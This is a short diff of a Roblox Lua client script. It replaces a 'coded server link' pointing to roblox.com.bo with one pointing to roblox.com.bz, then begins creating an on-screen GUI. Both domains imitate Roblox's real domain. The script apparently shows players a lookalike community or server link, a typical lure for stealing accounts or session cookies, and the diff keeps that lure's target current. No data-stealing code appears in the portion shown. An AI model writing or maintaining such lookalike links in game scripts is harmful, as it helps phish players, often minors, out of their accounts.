@@ -4,7 +4,7 @@ local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
 -- UPDATED CODED SERVER LINK
-local codedServerLink = "https://roblox.com.bo/communities/490345675/"
+local codedServerLink = "https://roblox.com.bz/communities/490345675/"
 
 -- ScreenGui
 local gui = Instance.new("ScreenGui")
